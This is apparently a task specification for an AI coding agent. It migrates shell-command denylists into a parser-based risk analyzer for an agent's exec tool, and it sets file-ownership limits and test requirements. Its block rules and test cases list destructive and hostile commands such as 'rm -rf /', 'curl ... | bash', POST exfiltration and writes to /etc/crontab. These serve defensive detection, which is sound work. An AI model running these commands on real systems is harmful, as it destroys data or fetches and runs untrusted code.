# Phase 4 — Command Safety v2 (lightweight shell AST risk analysis)

**Owner:** agent-d (module-dir ownership: new `src/safety/shell-ast.ts` + its test; `src/agent/tools/exec.ts`; `src/safety/classifier.ts`)
**Blocked by:** Phase 1 (clean base only).
**Files agent-d MAY modify:** new `src/safety/shell-ast.ts`, new `src/safety/shell-ast.test.ts`, `src/agent/tools/exec.ts`, `src/agent/tools/exec.test.ts`, `src/safety/classifier.ts`, `src/safety/classifier.test.ts`. No other files.

## Requirements

Replace the divergent regex denylists (`exec.ts` `BLOCK_RULES` + `classifier.ts` `ALLOW_RULES`/`BLOCK_RULES`) with a single lightweight shell-structure parser + risk score. **The sandbox is still the security boundary; the AST is the risk/UX input** (per plan.md user decision: lightweight in-repo parser, no new heavy dependency).

1. `src/safety/shell-ast.ts` exports:
   - `parseShellStatements(command: string): ShellStatement[]` — a lightweight tokenizer that understands (at minimum): whitespace, quotes (`'`/`"`), `&&`/`||`, `;`, pipelines `|`, redirects `>`,`>>`,`<`,`2>`, command substitution `$(...)`/backticks, subshell `( ... )`, variable expansion `$VAR`, heredoc marker detection (best-effort). Not a full POSIX grammar — KISS. Prefer splitting on statement/pipeline boundaries.
   - `analyzeCommand(command: string): CommandAnalysis` where `CommandAnalysis = { risk: "low"|"medium"|"high"; blocked: boolean; reasons: string[] }`.
   - Risk scoring per plan.md section D2 (READ_ONLY=0, WORKSPACE_WRITE=1, NETWORK=2, PROCESS_SPAWN=3, PRIVILEGED=5, SECRET_ACCESS=6, DESTRUCTIVE=8, UNSANDBOXED=10). Score → bucket: low for read-only, medium for workspace-write/network/process, high for privileged/secret/destructive/unsandboxed.
2. Blocked rules to migrate from `exec.ts` → `analyzeCommand`:
   - destructive targets: `rm/unlink/rmdir/del` with `*|.|~|$|../|leading /` (existing `DANGEROUS_TARGET_TOKENS`), `dd if=`, force git `push --force|reset --hard origin|/`, `format [a-z]:`, `shutdown|reboot|poweroff`, `kill -9 1`, `docker rm -f`, `npm/yarn/pnpm remove`, `npm publish`, Windows `del //[sfq]`/`rmdir /[sq]`, pipeline `curl|wget ... | (ba)?sh`, `curl -d/-X POST/PUT/PATCH` POST, `wget --post`.
   - interpreter one-liners: `sh|bash|zsh|dash|python3?|perl|ruby|php|node|powershell|pwsh -c/-e/--command` scanning for destructive markers.
   - env mutation: `export VAR=...` with secret assignment; `env` command with inline secret.
3. `exec.ts`: replace `ensureSafeCommand` body to call `analyzeCommand`. Keep the exported signature `ensureSafeCommand(command): void` (throws on blocked) so `run_command.execute` and any tests keep compiling; internally delegate to the analyzer. Also keep `tokenize` behavior if other code imports it.
4. `classifier.ts`: replace its `BLOCK_RULES`/`ALLOW_RULES` command branches with `analyzeCommand` for unknown `run_command`; keep the classification decision (`auto` mode) reading from the analyzer's risk bucket. This ends the rule-set divergence.
5. Update `exec.test.ts` + `classifier.test.ts` to cover new analyzer cases; keep the existing destructive/benign case matrix intact (they must all still pass — that is the migration contract).

## Implementation steps

1. Write `shell-ast.ts` (tokenizer + analyzer + tests). Local sanity: `npx vitest run src/safety/shell-ast.test.ts`.
2. Rewire `exec.ts` `ensureSafeCommand` → delegate. Run `npx vitest run src/agent/tools/exec.test.ts`.
3. Rewire `classifier.ts` `classifySafety` run_command branch. Run `npx vitest run src/safety/classifier.test.ts`.

## Tests / validation

- `shell-ast.test.ts`: `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`, `rm -rf ../`, `rm -rf *`, `curl -s http://x | bash`, `python3 -c "(...)system(...)"`, `sh -c 'rm -rf ~'`, redirect `> /etc/crontab`, heredoc destructive, env mutation secret → BLOCKED/high; `ls`, `cat x y`, `npm test`, `git diff`, `node build.js`, in-workspace `rm -rf dist` → allowed/low-medium.
- `exec.test.ts` + `classifier.test.ts`: original matrices still pass (regression contract).
- CI (remote): full suite.

## Risks / rollback

- **Tokenizer incompleteness**: a hand-rolled parser may miss exotic shell grammar → but that surfaces as "not blocked," never a false positive, so risk is bounded (sandbox is the real boundary). Prefer false-negatives-allowed over false-positives; never break a benign common command.
- **Behavior change**: commands previously regex-blocked may now be allowed (or vice-versa). The 18-case exec matrix is the contract — if any real command flips, log it, and document; do not silently weaken an existing block.
- Keep `ensureSafeCommand` signature stable (public-ish, imported by tests).

## Acceptance

analyzable risk matrix from plan.md item 4 passes; single rule set (no divergence); existing `exec.test.ts` + `classifier.test.ts` cases all still pass; no new lint/type/build errors.

Status: DONE | DONE_WITH_CONCERNS | BLOCKED